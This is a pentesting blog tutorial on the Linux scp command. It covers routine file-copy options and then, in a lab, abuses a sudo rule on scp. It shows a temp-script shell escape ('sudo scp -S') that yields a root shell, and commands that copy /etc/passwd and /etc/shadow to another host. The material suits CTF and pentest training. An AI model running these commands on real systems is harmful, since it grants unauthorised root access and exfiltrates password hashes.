<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Linux for Pentester: scp Privilege Escalation</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/linux-for-pentester-scp-privilege-escalation/" rel="bookmark"><time class="entry-date published" datetime="2019-08-09T18:12:54+00:00">August 9, 2019</time><time class="updated" datetime="2025-06-07T11:27:36+00:00">June 7, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this article, we are going to introduce another most helpful Linux command i.e. “scp” which is an abbreviated form of <strong>“secure copy</strong>”. The SCP command allows secure transferring of files between the local host and the remote host or between two remote hosts. So after knowing this fact we will check now how we can take advantage of this utility in privilege Escalation. </span></p>
<p class="ai-optimize-7"><span style="color: #000000;"><strong><em>NOTE: “The main objective of publishing the series of “Linux for pentester” is to introduce the circumstances and any kind of hurdles that can be faced by any pentester while solving CTF challenges or OSCP labs which are based on Linux privilege escalations. Here we do not criticize any kind of misconfiguration that a network or system administrator does for providing higher permissions on any programs/binaries/files &amp; etc.”  </em></strong></span></p>
<h3 class="ai-optimize-8"><span style="color: #800000;">Table of Content</span></h3>
<p class="ai-optimize-9"><span style="color: #000000;"><strong>Introduction to scp</strong></span></p>
<p class="ai-optimize-10"><span style="color: #000000;">Major Operation performed using scp</span></p>
<ul>
<li class="ai-optimize-11"><span style="color: #000000;">Copy a file from the local system to the remote machine</span></li>
<li class="ai-optimize-12"><span style="color: #000000;">Copy a file from a remote system to the local machine</span></li>
<li class="ai-optimize-13"><span style="color: #000000;">Provide modification time and date</span></li>
<li class="ai-optimize-14"><span style="color: #000000;">To display detailed information of the SCP process</span></li>
<li class="ai-optimize-15"><span style="color: #000000;">Copying file inside directory recursively</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">To specify a specific port</span></li>
</ul>
<p class="ai-optimize-17"><span style="color: #000000;"><strong>Exploiting scp</strong></span></p>
<ul>
<li class="ai-optimize-18"><span style="color: #000000;">Abusing Sudo right</span></li>
</ul>
<h3 class="ai-optimize-19"><span style="color: #800000;">Introduction to scp</span></h3>
<p class="ai-optimize-20"><span style="color: #000000;">SCP is a built-in command in Linux that allows you to copy file(s) between servers securely. In other words, it is a command-line utility that enables secure copying of files and directories between two locations. This command provides the same authentication and safety as the Secure Shell (SSH) protocol. Users know SCP for its effortlessness, security, and pre-installed accessibility.</span></p>
<h4 class="ai-optimize-21"><span style="color: #000000;"><u>Major Operation performed using scp</u></span></h4>
<p class="ai-optimize-22"><span style="color: #000000;">In this tutorial, we will show you how to use the scp command with detailed explanations of the most common scp options. For this, we will start from its help command as per below image.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">scp --help</pre>
<p class="ai-optimize-23"><span style="color: #000000;">After checking for its help command now we will proceed to its major operation one by one.</span></p>
<h5 class="ai-optimize-24"><span style="color: #000000;"><strong><u>Copy a file from local system to remote machine</u></strong>: </span></h5>
<p class="ai-optimize-24"><span style="color: #000000;">As we know the scp command tends the user to securely copy the file or directory from local to host connection or vice-versa so, by taking the help of this fact now we will copy a file whose name as <strong>“scan.xml”</strong> which is stored in my local system. For doing this we will frame command as below:</span></p>
<p class="lang:default decode:true ai-optimize-74"><strong>Syntax: scp [file name] remote_username@&lt;remote-IP&gt;:/path to copy</strong></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">scp scan.xml aarti@192.168.1.31:/home/aarti/Desktop</pre>
<p class="ai-optimize-25"><span style="color: #000000;">In the above command “scan.xml” is the file name that I want to copy, “aarti” is a remote user name, “192.168.1.31” is remote machine IP and ” /home/aarti/Desktop” is the path of the remote machine where I want to copy this file.</span></p>
<p class="ai-optimize-26"><span style="color: #000000;">Once we have done with our command then it will be prompted to enter the user password and the transfer process will start.</span></p>
<p class="ai-optimize-27"><span style="color: #000000;"><strong><em>Note</em></strong><em>: Omitting the filename from the destination location copies the file with the original name. If you want to save the file under a different name you need to specify a new name too.</em></span></p>
<p class="ai-optimize-28"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QGo2TYAZLJo/XU2yYJ1NJNI/AAAAAAAAf8M/1MlVOpqVOcsmiHO60GOHOfk-4dVlPZmPwCLcBGAs/s1600/1.png"/></span></p>
<p class="ai-optimize-29"><span style="color: #000000;">Hence on following above syntax, our desired file has been successfully copied to a destination location on the remote system as shown below.</span></p>
<p class="ai-optimize-30"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zl-0MwB8cwA/XU2yacv7gUI/AAAAAAAAf8k/SH9bABL7wBAQy_Ern9-qkKIO8y1dMD0VACLcBGAs/s1600/2.png"/></span></p>
<h5 class="ai-optimize-31"><span style="color: #000000;"><strong><u>Copy a file from the remote system to the local machine</u></strong>: </span></h5>
<p class="ai-optimize-31"><span style="color: #000000;">Alike above, we can also copy a file or directory from its remote machine to the local system. To grab this functionality, follow the below command.</span></p>
<p class="lang:default decode:true ai-optimize-75"><strong>Syntax: scp remote_username@&lt;remote-IP&gt;:/[file name] /path of destination directory </strong></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">scp aarti@192.168.1.31:/home/aarti/Desktop/demo.txt /root/Desktop</pre>
<p class="ai-optimize-32"><span style="color: #000000;">On framing the above command, we will again be prompted to enter the user password, and the transfer process will start.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls -al</pre>
<p class="ai-optimize-33"><span style="color: #000000;">Hence our desired file has been successfully copied to a destination location on the local system from the remote system.</span></p>
<p class="ai-optimize-34"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-V7Q31813X1Q/XU2ya2lnurI/AAAAAAAAf8o/SoKqEnTqQGALqLfcuFAgNNPnHBT0K0c-gCLcBGAs/s1600/4.png"/></span></p>
<h5 class="ai-optimize-35"><span style="color: #000000;"><strong><u>Provide modification time and date</u></strong>: </span></h5>
<p class="ai-optimize-35"><span style="color: #000000;">Many times, you might notice that by default, the system sets the time and date of the copied file to the current time and date.</span></p>
<p class="ai-optimize-36"><span style="color: #000000;">As in the below image, you can notice that our “demo.txt” file shows its “current date and time” when we copy it.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls -la /root/Desktop/demo.txt</pre>
<p class="ai-optimize-37"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZSuyvSsKPc8/XU2ybIkoRXI/AAAAAAAAf8s/3FZYKKw0XH0xyjUakuaRPLuFJgbjBKa_ACLcBGAs/s1600/5.png"/></span></p>
<p class="ai-optimize-38"><span style="color: #000000;">But in the below image, I show the original date and time, i.e., when the file was created.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls -la demo.txt</pre>
<p class="ai-optimize-39"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OtTi3hVLxwI/XU2ybeXgKhI/AAAAAAAAf8w/ohmR7KQewu8Pqqqf8KowzNEwqNDE5g4wACLcBGAs/s1600/6.png"/></span></p>
<p class="ai-optimize-40"><span style="color: #000000;">So, if we want to make a modification of our copied file to its original details, then we will use the “<strong>-p</strong>” option for this. After we add this argument, our file will retain its original date and time instead of using the current details.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">scp -p aarti@192.168.1.31:/home/aarti/Desktop/demo.txt /root/Desktop
ls -la /root/Desktop/demo.txt</pre>
<p class="ai-optimize-41"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DrxOCXLCevk/XU2ybmZLcUI/AAAAAAAAf80/07RsnJm-lbUGUHELKjpRvwTZEt7pZX7lwCLcBGAs/s1600/7.png"/></span></p>
<h5 class="ai-optimize-42"><span style="color: #000000;"><strong><u>To display detailed information about the SCP process</u></strong>: </span></h5>
<p class="ai-optimize-42"><span style="color: #000000;">You can observe from all of the screenshots above that you do not receive any information regarding the SCP process after you enter the password to copy the file. Instead, you receive a prompt from the system once again after the procedure is finished. So, if you want the detailed information of the SCP process, then you can use the “<strong>-v</strong>” parameter for this.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">scp -p -v aarti@192.168.1.31:/home/aarti/Desktop/demo.txt /root/Desktop</pre>
<p class="ai-optimize-43"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6zBocF5WHWo/XU2ycE5qUcI/AAAAAAAAf84/3EhMz_DwgAs7kGL2VKi55DU6vpniCVAEgCLcBGAs/s1600/8.png"/></span></p>
<h5 class="ai-optimize-44"><span style="color: #000000;"><strong><u>Copying the file inside directory recursively</u></strong>: </span></h5>
<p class="ai-optimize-44"><span style="color: #000000;">Sometimes we need to copy directory and all files/directories inside it. It will be better if we can do it in 1 command. SCP supports that scenario using the “<strong>-r</strong>” parameter.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">scp -r fluxion/ aarti@192.168.1.31: /home/aarti/Desktop</pre>
<p class="ai-optimize-45"><span style="color: #000000;">In the image below, I have copied a file “fluxion” recursively.</span></p>
<p class="ai-optimize-46"><span style="color: #000000;"><strong><em><u>Note</u></em></strong><em><u>:</u></em> <em>The speed for the process of copying any file is totally based upon its data length, but we can increase this speed by using “-C” option, which results in faster copying of the file.</em></span></p>
<p class="ai-optimize-47"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YoYXaAqgvL0/XU2ycXXXxAI/AAAAAAAAf88/3gD6DMpWbfMAelW5gkiVsNBWK1RccAumQCLcBGAs/s1600/9.png"/></span></p>
<p class="ai-optimize-48"><span style="color: #000000;">Here in the image below, we have successfully copied Fluxion.</span></p>
<p class="ai-optimize-49"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-64U8Xxrky9g/XU2yYPo-MQI/AAAAAAAAf8E/ASqoEgyjx1EJ-7zY-5MCwggzn2RHO68bQCLcBGAs/s1600/10.png"/></span></p>
<h5 class="ai-optimize-50"><span style="color: #000000;"><strong><u>To specify a specific port</u></strong><u>: </u></span></h5>
<p class="ai-optimize-50"><span style="color: #000000;">Usually, SCP uses port 22 as a default port. But for security reason, if you wish to change the port into another port then you can use the “<strong>-P</strong>” argument for this task.</span></p>
<p class="ai-optimize-51"><span style="color: #000000;">For example, we are going to use port 2222. Then the command needs to be </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">scp -P 2222 scan.xml aarti@193.168.1.31: /home/aarti/Desktop</pre>
<p class="ai-optimize-52"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-caZ3lQVdyCg/XU2yYDvDyII/AAAAAAAAf8I/iinzPew0W1AVgFq-Zt3M12U8dGlyzgshgCLcBGAs/s1600/11.png"/></span></p>
<h3 class="ai-optimize-53"><span style="color: #800000;">Lab setups for Sudo Privilege Escalation</span></h3>
<p class="ai-optimize-54"><span style="color: #000000;">Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user. Now we will start to perform privilege escalation for “scp”. For doing so we need to set up our lab of scp command with administrative rights.</span></p>
<p class="ai-optimize-55"><span style="color: #000000;">After that, we will give Sudo permission on scp, so that a local user can take the privilege of scp as the root user.</span></p>
<p class="ai-optimize-56"><span style="color: #000000;">Hence type following for enabling SUID:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">which scp</pre>
<p class="ai-optimize-57"><span style="color: #000000;">The below image clearly shows that I have created a local user (test) and will add sudo rights for the scp program in the /sudoers file, and type the following as user Privilege specification.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">test All=(root) NOPASSWD: /usr/bin/scp</pre>
<p class="ai-optimize-58"><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-92Uzuuyha38/XU2yZLp8cKI/AAAAAAAAf8Q/NlqwGB0E4sEMTe0PGOKkDO6hr0OKfEahQCLcBGAs/s1600/12.png"/></strong></span></p>
<h4 class="ai-optimize-59"><span style="color: #000000;"><u><span style="color: #800000;">First Method</span> </u></span></h4>
<p class="ai-optimize-60"><span style="color: #000000;">Then we will look for sudo right of “test” user (if given) and found that user “test” can execute the scp command as “root” without a password.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p class="ai-optimize-61"><span style="color: #000000;">On framing below command, it will direct us on root shell as shown below and we will successfully accomplish our task.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">TF=$(mktemp)
echo 'sh 0&lt;&amp;2 1&gt;&amp;2' &gt; $TF
chmod +x "$TF"
sudo scp -S $TF x y:</pre>
<p class="ai-optimize-62"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5AXEPcukNVw/XU2yZaj0HXI/AAAAAAAAf8U/9XLTU54ddh4uElSFDYDCVhPeibcybJJvwCLcBGAs/s1600/13.png"/></span></p>
<h4 class="ai-optimize-63"><span style="color: #800000;"><u>Second Method</u></span></h4>
<p class="ai-optimize-64"><span style="color: #000000;">To proceed further in our task of privilege escalation by the help of the second method very first we need to check the status for ssh service which should be active during our entire process (Kali Linux).</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">service ssh status</pre>
<p class="ai-optimize-65"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LKBiUOFnlEw/XU2yZsFrsqI/AAAAAAAAf8Y/Esj-uX97imMBA9OZ9ZJ8bm7Gr6doa1oRACLcBGAs/s1600/14.png"/></span></p>
<p class="ai-optimize-66"><span style="color: #000000;">Now I wish to copy passwd and shadow file of the host machine (Ubuntu) as per below image by the help of scp command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo scp /etc/passwd komal@192.168.1.11:~/
sudo scp /etc/shadow komal@192.168.1.11:~/</pre>
<p class="ai-optimize-67"><span style="color: #000000;">On framing the above command it will prompt to enter the user password so that the transfer process will start.</span></p>
<p class="ai-optimize-68"><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-IBx_JWNs_Zo/XU2yZxFqjEI/AAAAAAAAf8c/UmQ1LnrHlr41PiQ4ySvWPuBp_fLxg3xoACLcBGAs/s1600/15.png"/></strong></span></p>
<p class="ai-optimize-69"><span style="color: #000000;">Once you complete this, you can check whether the system has successfully copied your file or not by framing the command below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">head /home/komal/shadow
head /home/komal/passwd</pre>
<p class="ai-optimize-70"><span style="color: #000000;"><strong>Conclusion: </strong>Hence, we have achieved our mission and successfully copied the passwd and shadow files by the use of scp command.</span></p>
<p class="ai-optimize-71"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CiwyumxqQoo/XU2yaaEoHTI/AAAAAAAAf8g/zNT4kkp171soe4khxJgBECAzA4wDvDXmgCLcBGAs/s1600/16.png"/></span></p>
<p class="ai-optimize-72"><span style="color: #000000;">Reference: <a style="color: #000000;" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></span></p>
<p class="ai-optimize-6"><span style="color: #000000;">To Learn more about Privilege Escalation. Follow this</span> <a href="https://www.hackingarticles.in/category/privilege-escalation/">Link.</a></p>
<p class="ai-optimize-73"><span style="color: #000000;"><strong>Author</strong>: Komal Singh is a Cyber Security Researcher and Technical Content Writer. She is a completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/komal-rajput-26b783131/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
